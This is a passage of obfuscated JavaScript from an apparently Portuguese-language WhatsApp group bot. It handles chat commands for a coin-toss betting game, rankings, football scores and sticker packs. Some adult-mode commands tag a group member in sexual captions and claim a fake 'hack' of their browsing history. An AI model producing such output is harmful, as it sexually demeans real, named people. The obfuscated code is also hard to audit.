                  caption: _0x3c2f38
                };
                const _0x1d8364 = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, _0x2a72d2, _0x1d8364);
              }
              break;
            case "testeb0":
              const _0x1681b7 = {
                type: "quick_reply",
                texto: " 𝐌𝐄𝐍𝐔 ",
                id: _0x141936 + "menu"
              };
              const _0x470445 = {
                type: "quick_reply",
                texto: " AJUDA ",
                id: _0x141936 + "help"
              };
              let _0x326094 = [_0x1681b7, _0x470445];
              urlv = "https://telegra.ph/file/2e5289842b3b30d68cc8f.jpg";
              _0x842313(_0x346d97, urlv, "teste botao", _0x326094);
              break;
            case "ain":
              cardsData = [{
                'url': "https://i.postimg.cc/vHvZXjHg/ESDEATHV5x18.jpg",
                'text': "menu1" + lermais
              }, {
                'url': "https://i.postimg.cc/qRpBHx7D/ESDEATHV5x14.jpg",
                'text': "menu2"
              }, {
                'url': "https://i.postimg.cc/mrYZn5TF/ESDEATHV5x13.jpg",
                'text': "menu3"
              }, {
                'url': "https://i.postimg.cc/KzxrMw9G/ESDEATHV5x9.jpg",
                'text': "menu4"
              }];
              _0x5a1278(_0x346d97, cardsData);
              break;
            case "ccgold":
              {
                if (!_0x33d21e) {
                  return _0x50740b("Só é possível utilizar este comando ativando o sistema de Golds\nExemplo: " + _0x141936 + "sistemgold 1");
                }
                if (!_0x5e13bf) {
                  return _0x50740b("Mencione alguém no @ por gentileza!");
                }
                let _0x599239 = _0x3de59a.RS(_0x246d48, "Golds");
                let _0x4a265e = _0x3de59a.RS(_0x5e13bf, "Golds");
                if (_0x599239 < 50 || _0x4a265e < 50) {
                  return _0x5dcc57(_0x599239 < 50 ? "Você não tem essa quantidade de Golds para apostar. Verifique se há chances de minerar ou outras ações em menugold. Boas aventuras!" : '@' + _0x5e13bf.split('@')[0] + " não tem Golds suficientes para aceitar o desafio.");
                }
                _0x5dcc57('@' + _0x5e13bf.split('@')[0] + ", você foi desafiado para um cara ou coroa, você aceita o desafio?\nPara aceitar digite \"aceito\", e para recusar digite \"recusar\"!");
                let _0x9f7c8d = ["cara", "coroa"];
                let _0x2bd5bf = _0x9f7c8d[Math.floor(Math.random() * _0x9f7c8d.length)];
                let _0x40de0a = _0xd2050d.messageTimestamp;
                let _0xd3086b = _0x10b978();
                const _0x1b273c = {
                  userX: _0x5e13bf,
                  userY: _0x246d48,
                  accept: false,
                  sort: _0x2bd5bf,
                  time: _0x40de0a
                };
                _0xd3086b[_0x346d97] = _0x1b273c;
                _0x245ba2(_0xd3086b);
                setTimeout(() => {
                  let _0x10730d = _0x10b978();
                  if (_0x10730d[_0x346d97] && _0x10730d[_0x346d97].time == _0x40de0a && !_0x10730d[_0x346d97].accept) {
                    delete _0x10730d[_0x346d97];
                    _0x245ba2(_0x10730d);
                    _0x50740b("Jogo resetado devido à inatividade!");
                  }
                }, 30000);
              }
              break;
            case "resetccgold":
              {
                if (!_0x3f2f63) {
                  return _0x50740b("Fale com quem iniciou o jogo, só ele pode resetar, ou então algum ADM");
                }
                let _0x8378e7 = _0x10b978();
                if (_0x8378e7[_0x346d97]) {
                  delete _0x8378e7[_0x346d97];
                  _0x245ba2(_0x8378e7);
                  _0x50740b("Jogo resetado com sucesso!");
                } else {
                  _0x50740b("Não há nenhuma sessão em andamento...");
                }
              }
              break;
            case "rankemojigold":
              {
                if (!_0x89cd51) {
                  return _0x50740b("Este comando só pode ser usado em grupos.");
                }
                if (!_0x33d21e) {
                  return _0x50740b("Este comando só pode ser utilizado quando o sistema " + _0x141936 + "sistemgold 1 está ativado.");
                }
                let _0x3c9f5b = _0x265e03.find(_0x3273f2 => _0x3273f2.grupo === _0x346d97);
                let _0x172832 = "🏆 Ranking dos Usuários 🏆\n\n";
                _0x3c9f5b.usuarios.sort((_0x20d2a6, _0x23f42c) => _0x23f42c.pontos - _0x20d2a6.pontos);
                _0x3c9f5b.usuarios.forEach((_0x3641ea, _0x4b2bc6) => {
                  let _0x4920d6;
                  if (_0x4b2bc6 === 0) {
                    _0x4920d6 = '🥇';
                  } else {
                    if (_0x4b2bc6 === 1) {
                      _0x4920d6 = '🥈';
                    } else {
                      if (_0x4b2bc6 === 2) {
                        _0x4920d6 = '🥉';
                      } else {
                        _0x4920d6 = _0x4b2bc6 + 1 + '.';
                      }
                    }
                  }
                  _0x172832 += _0x4920d6 + " @" + _0x3641ea.id.split('@')[0] + " - Pontuação: " + _0x3641ea.pontos + "\n";
                });
                _0x172832 += "\n\nPrimeiro ganhará 50 de gold\nsegundo 30 de gold\nterceiro 15 de gold";
                let _0x1fe89e = new Date(_0x3c9f5b.Data);
                let _0x21a978 = new Date(_0x1fe89e.getTime() + 3600000);
                let _0x2f654b = new Date();
                let _0x1eab54 = _0x21a978.getTime() - _0x2f654b.getTime();
                let _0x2a5f25 = Math.floor(_0x1eab54 / 3600000);
                let _0x187bdf = Math.floor(_0x1eab54 % 3600000 / 60000);
                let _0x468b39 = '' + (_0x2a5f25 ? _0x2a5f25 + " horas" : '') + (_0x187bdf ? " " + _0x187bdf + " minutos" : '');
                _0x172832 += "\n\nPróximo Envio Do Emoji:" + _0x468b39;
                let _0x128a5f = new Date();
                if (_0x2f654b.getHours() >= 21) {
                  _0x128a5f.setDate(_0x2f654b.getDate() + 1);
                }
                _0x128a5f.setHours(21, 0, 0, 0);
                let _0x2b4f2f = _0x128a5f - _0x2f654b;
                let _0x369765 = Math.floor(_0x2b4f2f / 3600000);
                let _0x3822e9 = Math.floor(_0x2b4f2f % 3600000 / 60000);
                let _0x4e4e81 = Math.floor(_0x2b4f2f % 60000 / 1000);
                let _0x514b83 = '' + (_0x369765 ? _0x369765 + "hrs," : '') + (_0x3822e9 ? (_0x369765 ? " " : '') + _0x3822e9 + 'm' : '') + (_0x4e4e81 ? (_0x369765 || _0x3822e9 ? " e " : '') + _0x4e4e81 + 's' : '');
                let _0xfc0411 = _0x128a5f.toLocaleDateString("pt-BR", {
                  'timeZone': "America/Sao_Paulo"
                }) + " " + _0x128a5f.toLocaleTimeString("pt-BR", {
                  'timeZone': "America/Sao_Paulo"
                });
                _0x172832 += "\nPróximo reset: " + _0xfc0411;
                _0x172832 += "\nTempo restante: " + _0x514b83;
                _0x5196be.sendMessage(_0x3c9f5b.grupo, {
                  'text': _0x172832,
                  'mentions': _0x3c9f5b.usuarios.map(_0x5b9c00 => _0x5b9c00.id)
                });
              }
              break;
            case "meuscmd":
              {
                let _0x4f124d = fs.readFileSync("./index.js").toString();
                let _0x3725dd = _0x4f124d.split("\n");
                let _0x4d82e8 = [];
                _0x3725dd.forEach(_0x8de3b0 => {
                  if (_0x8de3b0.includes("case")) {
                    let _0x4804ce = _0x8de3b0.match(/case\s+['"]([^'"]+)['"]/);
                    if (_0x4804ce && _0x4804ce[1]) {
                      _0x4d82e8.push(_0x4804ce[1]);
                    }
                  }
                });
                const _0x92f1e8 = {
                  cases: _0x4d82e8
                };
                let _0x41723a = JSON.stringify(_0x92f1e8, null, 2);
                fs.writeFileSync("./caseNames.json", _0x41723a);
                console.log("Nomes dos casos foram salvos em caseNames.json");
              }
              break;
            case "mentiongold":
            case "mencgold":
              if (!_0x33d21e && _0x326cbd[0].emojigold === false) {
                return _0x50740b("o sistema gold ou emojigold não estão ativo neste grupo");
              }
              if (!dadosDoGrupo.hasOwnProperty("mentions") || !Array.isArray(dadosDoGrupo.mentions)) {
                dadosDoGrupo.mentions = [];
              }
              index = dadosDoGrupo.mentions.indexOf(_0x246d48);
              if (index !== -1) {
                dadosDoGrupo.mentions.splice(index, 1);
                _0x50740b("Você foi removido da lista de menções.");
              } else {
                dadosDoGrupo.mentions.push(_0x246d48);
                _0x50740b("Você foi adicionado à lista de menções.");
              }
              fs.writeFileSync("./DADOS/json/messageData.json", JSON.stringify(_0x265e03, null, 2));
              break;
            case "tabelachamp":
              if (!_0x11e99e) {
                return _0x50740b("Informe até qual posição você deseja que eu mostre");
              }
              if (!Number(_0x23d865[0]) || Number(_0x11e99e.trim()) > 20) {
                return _0x50740b("não pode mais de 20..");
              }
              axios.get("https://www.terra.com.br/esportes/futebol/brasileiro-serie-a/tabela/").then(_0x123473 => {
                if (_0x123473.status === 200) {
                  let _0xd8f552 = _0x123473.data;
                  let _0x16a799 = cheerio.load(_0xd8f552);
                  let _0x454c5e = [];
                  _0x16a799("tbody tr").each((_0x198f9d, _0x271fd1) => {
                    let _0x2c3009 = _0x16a799(_0x271fd1).find(".position").text();
                    let _0x8b411 = _0x16a799(_0x271fd1).find(".team-name a").text().replace('>>', '').trim();
                    let _0x1c3fdf = _0x16a799(_0x271fd1).find(".points").text();
                    const _0x5b8d28 = {
                      position: _0x2c3009,
                      teamName: _0x8b411,
                      points: _0x1c3fdf
                    };
                    _0x454c5e.push(_0x5b8d28);
                  });
                  ldata.sort((_0x54f928, _0x1ea967) => parseInt(_0x54f928.position) - parseInt(_0x1ea967.position));
                  let _0xde7f2f = Math.max(..._0x454c5e.map(_0xc304f => _0xc304f.teamName.length));
                  let _0xce105f = '';
                  for (let _0x2bd4af = 0; _0x2bd4af < _0x11e99e; _0x2bd4af++) {
                    let _0x1fe5a6 = _0x454c5e[_0x2bd4af];
                    let _0x536626 = _0x1fe5a6.teamName.padEnd(_0xde7f2f, " ");
                    _0xce105f += '⚽' + _0x1fe5a6.position + "ª | 🛡️" + _0x536626 + "Pontos💠: " + _0x1fe5a6.points + "\n";
                  }
                  _0x50740b(_0xce105f);
                }
              })["catch"](_0x4f93f6 => {
                _0x50740b(_0x4f93f6);
              });
              break;
            case "ultimosjogos":
              if (!_0x11e99e) {
                return _0x50740b("Que time, mano?");
              }
              const _0x4b4bc2 = {
                "São Paulo": "sao-paulo",
                "América-MG": "america-mg",
                "Atlético-MG": "atletico-mg"
              };
              timeMap = _0x4b4bc2;
              qModified = Object.keys(timeMap).reduce((_0x15d8f2, _0x52e0b2) => _0x15d8f2.replace(new RegExp(_0x52e0b2, 'ig'), timeMap[_0x52e0b2]), _0x11e99e.toLowerCase());
              encodedQModified = encodeURIComponent(qModified);
              let _0x1e9bcf = "https://www.placardefutebol.com.br/time/" + encodedQModified + "/ultimos-jogos";
              axios.get(_0x1e9bcf).then(_0x202959 => {
                if (_0x202959.status === 200) {
                  let _0x3da2c4 = _0x202959.data;
                  let _0x5163e5 = cheerio.load(_0x3da2c4);
                  let _0x4aae47 = _0x5163e5(".match__lg_card");
                  let _0x19e0d8 = '';
                  _0x4aae47.each((_0x400ac5, _0x441aef) => {
                    let _0x408f81 = _0x5163e5(_0x441aef).find(".match__lg_card--league").text().trim();
                    let _0x38dd7b = _0x5163e5(_0x441aef).find(".match__lg_card--ht-name.text").text().trim();
                    let _0x2c957e = _0x5163e5(_0x441aef).find(".match__lg_card--at-name.text").text().trim();
                    let _0x5d7221 = _0x5163e5(_0x441aef).find(".match__lg_card--scoreboard b").toArray().map(_0x48a33b => _0x5163e5(_0x48a33b).text().trim()).join(" - ");
                    let _0x171d62 = _0x5163e5(_0x441aef).find(".match__lg_card--date").text().trim();
                    _0x19e0d8 += _0x408f81 + ",\n" + _0x38dd7b + " x " + _0x2c957e + "\nPlacar: " + _0x5d7221 + "\nData: " + _0x171d62 + "\n";
                    _0x19e0d8 += "-----------------------\n";
                  });
                  _0x50740b("Últimos jogos do time:\n\n" + _0x19e0d8 + '');
                } else {
                  _0x50740b("Erro ao acessar a página.");
                }
              })["catch"](_0xfda341 => {
                console.log("Erro ao fazer a requisição:", _0xfda341.message);
              });
              break;
            case "placares":
              function _0x2d967a() {
                return axios.get("https://www.placardefutebol.com.br/").then(_0x28b2fa => {
                  let _0x41caf3 = _0x28b2fa.data;
                  let _0x2f771a = cheerio.load(_0x41caf3);
                  let _0x4f9499 = _0x2f771a(".container.content.trending-box");
                  let _0x2e20c9 = _0x4f9499.find('a').map((_0x3fb4ed, _0x3d8e56) => {
                    let _0x272c41 = _0x2f771a(_0x3d8e56).find(".match-card-league-name").text().trim();
                    let _0x5dd59a = _0x2f771a(_0x3d8e56).find(".team-name .text-right.team_link").text().trim();
                    let _0x50101b = _0x2f771a(_0x3d8e56).find(".team-name .text-left.team_link").text().trim();
                    let _0x34ea36 = _0x2f771a(_0x3d8e56).find(".match-score h4 span").eq(0).text().trim();
                    let _0x5107f0 = _0x2f771a(_0x3d8e56).find(".match-score h4 span").eq(1).text().trim();
                    let _0x4b5334 = _0x34ea36 + " x " + _0x5107f0;
                    let _0x2c073f = _0x2f771a(_0x3d8e56).find(".status-name").text().trim();
                    return "Competição: " + _0x272c41 + "\nTime Casa: " + _0x5dd59a + " (" + _0x34ea36 + ")\nTime Fora: " + _0x50101b + " (" + _0x5107f0 + ")\nPlacar: " + _0x4b5334 + "\nData: " + _0x2c073f + "\n\n";
                  }).get().join('');
                  return _0x2e20c9;
                })["catch"](_0x40be92 => {
                  return "Erro ao fazer a requisição: " + _0x40be92.message;
                });
              }
              _0x2d967a().then(_0x445c0c => {
                _0x50740b("Placares dos jogos:\n" + _0x445c0c);
              });
              break;
            case "meutime2":
              if (!_0x11e99e) {
                return _0x50740b("Informe o nome do time.");
              }
              try {
                function _0x5cc346(_0x4fd139, _0x3a6707, _0xc2abb2) {
                  return _0x4fd139 >= 0 ? _0x4fd139 + " " + _0x3a6707 : _0x4fd139 + " " + _0xc2abb2;
                }
                let _0x2b24c3 = await fetchJson("http://baddeveloper.space:25576/api/meutime?q=" + _0x11e99e);
                let _0x34e13f = _0x2b24c3.resultado;
                if (!_0x34e13f || _0x34e13f.length === 0) {
                  return _0x50740b("Nenhum time encontrado.");
                }
                let {
                  teamName: _0x3a18ae,
                  position: _0x1001b8,
                  points: _0x53c3c6,
                  gamesPlayed: _0x4b15d5,
                  draws: _0x22b827,
                  losses: _0x1795dd,
                  goalsFor: _0x256fe6,
                  goalsAgainst: _0x268ab5,
                  goalDifference: _0x4a05e5,
                  approval: _0x637f4f
                } = _0x34e13f[0];
                _0x50740b("🏆 Informações do Time 🏆\n\nTime: " + _0x3a18ae + " 🎽\nPosição: " + _0x1001b8 + " 📊\nPontos: " + (_0x53c3c6 >= 0 ? _0x53c3c6 + " " + '⚽️' : _0x53c3c6 + " " + '❌') + "\nJogos Disputados: " + _0x4b15d5 + " 🏃‍♂️\nEmpates: " + (_0x22b827 >= 0 ? _0x22b827 + " " + '🤝' : _0x22b827 + " " + '❌') + "\nDerrotas: " + (_0x1795dd >= 0 ? _0x1795dd + " " + '👎' : _0x1795dd + " " + '✅') + "\nGols Feitos: " + _0x256fe6 + " ⚽️\nGols Sofridos: " + _0x268ab5 + " ⚽️\nSaldo de Gols: " + (_0x4a05e5 >= 0 ? _0x4a05e5 + " " + '⚽️' : _0x4a05e5 + " " + '❌') + "\nAproveitamento: " + (_0x637f4f >= 0 ? _0x637f4f + " " + '👍' : _0x637f4f + " " + '👎') + "\n");
              } catch (_0x2a4831) {
                console.error("Deu Ruim:", _0x2a4831.message);
                _0x50740b("Erro ao obter os dados do servidor.");
              }
              break;
            case "noticiatime":
              if (!_0x11e99e) {
                return _0x50740b("Qual time, mano?");
              }
              const _0x16b1b3 = {
                "São Paulo": "sao-paulo",
                "América-MG": "america-mg",
                "Atlético-MG": "atletico-mg"
              };
              timeMap = _0x16b1b3;
              qModified = Object.keys(timeMap).reduce((_0x4b8d92, _0x2c00b9) => _0x4b8d92.replace(new RegExp(_0x2c00b9, 'ig'), timeMap[_0x2c00b9]), _0x11e99e.toLowerCase());
              encodedQModified = encodeURIComponent(qModified);
              newurl = "http://baddeveloper.space:25576/api/noticiatime?q=" + encodedQModified;
              try {
                getResultado = await fetchJson(newurl);
                conteudo = getResultado.content;
                let {
                  title: _0x3017e6,
                  imageUrl: _0x3ea886
                } = getResultado;
                const _0x550870 = {
                  url: _0x3ea886
                };
                const _0x3c6635 = {
                  image: _0x550870,
                  caption: "By Van:http://painel.iblgroup.cloud\n\n\n" + conteudo
                };
                _0x5196be.sendMessage(_0x346d97, _0x3c6635);
              } catch (_0x12cc0f) {
                console.error("Erro ao buscar notícia:", _0x12cc0f);
                _0x50740b("Ocorreu um erro ao buscar a notícia. Tente novamente mais tarde.");
              }
              break;
            case "prox_jogo2":
              if (!_0x11e99e) {
                return _0x50740b("cade o time?");
              }
              const _0x4635f5 = {
                "São Paulo": "sao-paulo",
                "América-MG": "america-mg",
                "Atlético-MG": "atletico-mg"
              };
              timeMap = _0x4635f5;
              qModified = Object.keys(timeMap).reduce((_0x451015, _0x3ce446) => _0x451015.replace(new RegExp(_0x3ce446, 'ig'), timeMap[_0x3ce446]), _0x11e99e.toLowerCase());
              encodedQModified = encodeURIComponent(qModified);
              let _0x5a64e9 = "https://www.placardefutebol.com.br/time/" + encodedQModified + "/proximos-jogos";
              axios.get(_0x5a64e9).then(_0x27ee5f => {
                if (_0x27ee5f.status === 200) {
                  let _0xed1d39 = _0x27ee5f.data;
                  let _0x29dbc9 = cheerio.load(_0xed1d39);
                  let _0x4ed485 = [];
                  _0x29dbc9("#main .match__lg_card").each((_0x1682ba, _0x35a6b6) => {
                    let _0x28db69 = {
                      liga: _0x29dbc9(_0x35a6b6).find(".match__lg_card--league").text(),
                      data: _0x29dbc9(_0x35a6b6).find(".match__lg_card--datetime").text().trim().replace(/\s+/g, " "),
                      timeCasa: _0x29dbc9(_0x35a6b6).find(".match__lg_card--ht-name").text(),
                      timeVisitante: _0x29dbc9(_0x35a6b6).find(".match__lg_card--at-name").text()
                    };
                    _0x4ed485.push(_0x28db69);
                  });
                  jogosJSON = JSON.stringify(_0x4ed485);
                  let _0x3df9eb = "-----------------------------------------------------\n";
                  _0x4ed485.forEach(_0x56d18f => {
                    _0x3df9eb += " " + _0x10acc8(_0x56d18f.liga, 15) + "\n" + _0x10acc8(_0x56d18f.data, 13) + "\n" + _0x10acc8(_0x56d18f.timeCasa, 11) + " X  " + _0x10acc8(_0x56d18f.timeVisitante, 17) + " \n";
                    _0x3df9eb += "------------------------------------------------------\n";
                  });
                  _0x50740b(_0x3df9eb);
                }
              })["catch"](_0x24de5d => {
                console.log(_0x24de5d);
              });
              function _0x10acc8(_0x265641, _0x59b0ae) {
                let _0x412652 = Math.max(_0x59b0ae - _0x265641.length, 0);
                return _0x265641 + " ".repeat(_0x412652);
              }
              break;
            case "websexo":
              if (!_0x89cd51) {
                return _0x50740b(enviar.msg.grupo);
              }
              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18 1");
              }
              if (!_0x5e13bf || _0xd79836[1]) {
                return _0x50740b("marque a pessoa que você quer fazer amor, a mensagem ou o @");
              }
              const _0x3cede6 = {
                url: "https://telegra.ph/file/4daf4c63b703f3e0961c3.jpg"
              };
              const _0x148e13 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, {
                'image': _0x3cede6,
                'caption': "Você acaba de fazer um sex* gostoso com: @" + _0x5e13bf.split('@')[0] + "\nsó pra lembrar que quero ser titia 😈❤️",
                'mentions': [_0x5e13bf]
              }, _0x148e13);
              break;
            case "punheteiro":
              if (!_0x89cd51) {
                return _0x50740b(enviar.msg.grupo);
              }
              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18 1");
              }
              _0x5dcc57("Hackeando seu histórico do Google: @" + _0x430801.split('@')[0] + " aguarde...");
              setTimeout(async () => {
                let _0x50c99c = Math.floor(Math.random() * 100);
                punheta = _0x50c99c;
                if (punheta < 20) {
                  var _0x49b0cf = "bixinho ta se descobrindo ainda... 🤪";
                } else {
                  if (punheta < 40) {
                    var _0x49b0cf = "diz que não bate, porém não me engana! 🙃";
                  } else {
                    if (punheta < 60) {
                      var _0x49b0cf = "xvideos deve ta ficando rico... 🥵";
                    } else {
                      if (punheta < 80) {
                        var _0x49b0cf = "3 por dia no máximo! 🔞";
                      } else {
                        if (punheta < 100) {
                          var _0x49b0cf = "puberdade domina 🔥";
                        }
                      }
                    }
                  }
                }
                const _0x1ebcc8 = {
                  url: "https://telegra.ph/file/75dde0988c9a76d2c4fb9.jpg"
                };
                const _0xf4d161 = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, {
                  'image': _0x1ebcc8,
                  'caption': "Detectei um punheteiro: @" + _0x430801.split('@')[0] + "\n-> com uma porcentagem de: *" + _0x50c99c + "%*\n\n" + _0x49b0cf,
                  'mentions': [_0x430801]
                }, _0xf4d161);
              }, 7000);
              break;
            case "siririqueira":
              if (!_0x89cd51) {
                return _0x50740b(enviar.msg.grupo);
              }
              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18 1");
              }
              _0x5dcc57("Hackeando seu histórico de navegação: @" + _0x430801.split('@')[0] + " aguarde...");
              setTimeout(async () => {
                let _0x3319aa = Math.floor(Math.random() * 100);
                siririca = _0x3319aa;
                if (siririca < 20) {
                  var _0x3db791 = "que fogo é esse menina... 👀";
                } else {
                  if (siririca < 40) {
                    var _0x3db791 = "não paga de santa pra mim... 😏";
                  } else {
                    if (siririca < 60) {
                      var _0x3db791 = "kid bengala se achando... 🙄";
                    } else {
                      if (siririca < 80) {
                        var _0x3db791 = "fogo dessa menina cada dia aumenta, mds 🥵";
                      } else {
                        if (siririca < 100) {
                          var _0x3db791 = "to achando que ela já tá dando pot ai... 😈";
                        }
                      }
                    }
                  }
                }
                const _0x26ddf0 = {
                  url: "https://telegra.ph/file/7cb54a7f2ed720d214e4a.jpg"
                };
                const _0x28ddb5 = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, {
                  'image': _0x26ddf0,
                  'caption': "Detectei uma siririqueira: @" + _0x430801.split('@')[0] + "\n-> com uma porcentagem de: *" + _0x3319aa + "%*\n\n" + _0x3db791,
                  'mentions': [_0x430801]
                }, _0x28ddb5);
              }, 7000);
              break;
            case "packsfigsts":
              const _0x1761f8 = {
                title: "❄️ 𝐀𝐌𝐀𝐍𝐃𝐀 ❄️",
                id: "packfig amanda"
              };
              const _0x544271 = {
                title: "❄️ 𝐀𝐍𝐘𝐀 ❄️",
                id: "packfig anya"
              };
              const _0x19632d = {
                title: "❄️ 𝐀𝐍𝐈𝐌𝐀𝐃𝐀𝐒𝟏 ❄️",
                id: "packfig animadas1"
              };
              const _0x30a8e1 = {
                title: "❄️ 𝐀𝐍𝐈𝐌𝐀𝐃𝐀𝐒𝟐 ❄️",
                id: "packfig animadas2"
              };
              const _0x2e074a = {
                title: "❄️ 𝐀𝐒𝐓𝐀 ❄️",
                id: "packfig asta"
              };
              const _0x50ec71 = {
                title: "❄️ 𝐀𝐒𝐔𝐍𝐀 ❄️",
                id: "packfig asuna"
              };
              const _0x5ca384 = {
                title: "❄️ 𝐀𝐘𝐀𝐊𝐀 ❄️",
                id: "packfig ayaka"
              };
              const _0x46c8e8 = {
                title: "❄️ 𝐁𝐀𝐊𝐔𝐆𝐎𝐔 ❄️",
                id: "packfig bakugou"
              };
              const _0x18151f = {
                title: "❄️ 𝐁𝐄𝐍 ❄️",
                id: "packfig ben"
              };
              const _0x594c59 = {
                title: "❄️ 𝐁𝐎𝐑𝐔𝐓𝐎 ❄️",
                id: "packfig boruto"
              };
              const _0x32190b = {
                title: "❄️ 𝐁𝐑𝐀𝐃 ❄️",
                id: "packfig brad"
              };
              const _0x3adf52 = {
                title: "❄️ 𝐃𝐎𝐔𝐌𝐀 ❄️",
                id: "packfig douma"
              };
              const _0x4bd026 = {
                title: "❄️ 𝐄𝐒𝐃𝐄𝐀𝐓𝐇𝟏 ❄️",
                id: "packfig esdeath1"
              };
              const _0x4a2699 = {
                title: "❄️ 𝐄𝐒𝐃𝐄𝐀𝐓𝐇𝟐 ❄️",
                id: "packfig esdeath2"
              };
              const _0x5b67e6 = {
                title: "❄️ 𝐅𝐋𝐎𝐎𝐏𝐀 ❄️",
                id: "packfig floopa"
              };
              const _0xcaad50 = {
                title: "❄️ 𝐅𝐑𝐀𝐍 ❄️",
                id: "packfig fran"
              };
              const _0xeddf5b = {
                title: "❄️ 𝐅𝐑𝐄𝐃𝐃𝐘 ❄️",
                id: "packfig freddy"
              };
              const _0x24973a = {
                title: "❄️ 𝐆𝐀𝐌𝐎-𝐂𝐇𝐀𝐍 ❄️",
                id: "packfig gamo-chan"
              };
              const _0x45e603 = {
                title: "❄️ 𝐆𝐎𝐊𝐔 ❄️",
                id: "packfig goku"
              };
              const _0x2498c4 = {
                title: "❄️ 𝐆𝐔𝐍𝐓𝐇𝐄𝐑 ❄️",
                id: "packfig gunther"
              };
              const _0x3e3313 = {
                title: "❄️ 𝐆𝐖𝐄𝐍 ❄️",
                id: "packfig gwen"
              };
              const _0x2f4ecc = {
                title: "❄️ 𝐆𝐘𝐎𝐌𝐄𝐈 ❄️",
                id: "packfig gyomei"
              };
              const _0x4c3e01 = {
                title: "❄️ 𝐇𝐀𝐃𝐄𝐒 ❄️",
                id: "packfig hades"
              };
              const _0x2fec9e = {
                title: "❄️ 𝐇𝐄𝐗 ❄️",
                id: "packfig hex"
              };
              const _0x4d6625 = {
                title: "❄️ 𝐇𝐈𝐍𝐀𝐓𝐀 ❄️",
                id: "packfig hinata"
              };
              const _0x6b84fd = {
                title: "❄️ 𝐇𝐈𝐍𝐀𝐓𝐀𝟐 ❄️",
                id: "packfig hinata2"
              };
              const _0x546efc = {
                title: "❄️ 𝐉𝐀𝐈𝐋𝐒𝐎𝐍 ❄️",
                id: "packfig jaison"
              };
              const _0x9551a8 = {
                title: "❄️ 𝐉𝐀𝐏𝐈𝐍𝐇𝐀𝟏 ❄️",
                id: "packfig japinha1"
              };
              const _0x3ab066 = {
                title: "❄️ 𝐉𝐀𝐏𝐈𝐍𝐇𝐀𝟐 ❄️",
                id: "packfig japinha2"
              };
              const _0xcac901 = {
                title: "❄️ 𝐉𝐀𝐏𝐈𝐍𝐇𝐀𝟑 ❄️",
                id: "packfig japinha3"
              };
              const _0x41af9b = {
                title: "❄️ 𝐉𝐔𝐉𝐔𝐓𝐒𝐔 𝐊𝐀𝐈𝐒𝐄𝐍 ❄️",
                id: "packfig jjk"
              };
              const _0x24c2ef = {
                title: "❄️ 𝐊𝐈𝐂𝐊 ❄️",
                id: "packfig kick"
              };
              const _0x22271f = {
                title: "❄️ 𝐊𝐈𝐓𝐀𝐆𝐀𝐖𝐀 ❄️",
                id: "packfig kitagawa"
              };
              const _0x4d1c9a = {
                title: "❄️ 𝐋𝐄𝐕𝐈 ❄️",
                id: "packfig levi"
              };
              const _0x3ac4fb = {
                title: "❄️ 𝐋𝐎𝐓𝐔𝐒𝟏 ❄️",
                id: "packfig lotus1"
              };
              const _0x36263a = {
                title: "❄️ 𝐋𝐎𝐓𝐔𝐒𝟐 ❄️",
                id: "packfig lotus2"
              };
              const _0x2f3c6b = {
                title: "❄️ 𝐋𝐔𝐌 ❄️",
                id: "packfig lum"
              };
              const _0x4e6f84 = {
                title: "❄️ 𝐌𝐀𝐃𝐀𝐑𝐀 ❄️",
                id: "packfig madara"
              };
              const _0x4a974c = {
                title: "❄️ 𝐌𝐂𝐋𝐎𝐕𝐈𝐍 ❄️",
                id: "packfig mclovin"
              };
              const _0x53abff = {
                title: "🔞 𝐏𝐀𝐂𝐊+𝟏𝟖 𝟏 🔞",
                id: "packfig18 0"
              };
              const _0xb95390 = {
                title: "🔞 𝐏𝐀𝐂𝐊+𝟏𝟖 𝟐 🔞",
                id: "packfig18 1"
              };
              const _0x1934ad = {
                title: "🔞 𝐏𝐀𝐂𝐊+𝟏𝟖 𝟑 🔞",
                id: "packfig18 2"
              };
              const _0xec433a = {
                title: "🔞 𝐏𝐀𝐂𝐊+𝟏𝟖 𝟒 🔞",
                id: "packfig18 3"
              };
              const _0x36bf14 = {
                title: "🔞 𝐏𝐀𝐂𝐊+𝟏𝟖 𝟓 🔞",
                id: "packfig18 4"
              };
              const _0x595643 = {
                title: "🔞 𝐏𝐀𝐂𝐊+𝟏𝟖 𝟔 🔞",
                id: "packfig18 5"
              };
              const _0x565bf4 = {
                title: "🔞 𝐏𝐀𝐂𝐊+𝟏𝟖 𝟕 🔞",
                id: "packfig18 6"
              };
              const _0x45857b = {
                title: "🔞 𝐏𝐀𝐂𝐊+𝟏𝟖 𝟖 🔞",
                id: "packfig18 7"
              };
              const _0x48d3fc = {
                title: "🔞 𝐏𝐀𝐂𝐊+𝟏𝟖 𝟗 🔞",
                id: "packfig18 8"
              };
              const _0x38d9d0 = {
                title: "🔞 𝐏𝐀𝐂𝐊+𝟏𝟖 𝟏𝟎 🔞",
                id: "packfig18 9"
              };
              const _0x20bed1 = {
                title: "❄️ 𝐏𝐑𝐎𝐗𝐈𝐌𝐀 𝐏𝐀𝐆𝐈𝐍𝐀 ❄️",
                id: "packsfigs2"
              };
              botaoale = [_0x1761f8, _0x544271, _0x19632d, _0x30a8e1, _0x2e074a, _0x50ec71, _0x5ca384, _0x46c8e8, _0x18151f, _0x594c59, _0x32190b, _0x3adf52, _0x4bd026, _0x4a2699, _0x5b67e6, _0xcaad50, _0xeddf5b, _0x24973a, _0x45e603, _0x2498c4, _0x3e3313, _0x2f4ecc, _0x4c3e01, _0x2fec9e, _0x4d6625, _0x6b84fd, _0x546efc, _0x9551a8, _0x3ab066, _0xcac901, _0x41af9b, _0x24c2ef, _0x22271f, _0x4d1c9a, _0x3ac4fb, _0x36263a, _0x2f3c6b, _0x4e6f84, _0x4a974c, _0x53abff, _0xb95390, _0x1934ad, _0xec433a, _0x36bf14, _0x595643, _0x565bf4, _0x45857b, _0x48d3fc, _0x38d9d0, _0x20bed1];
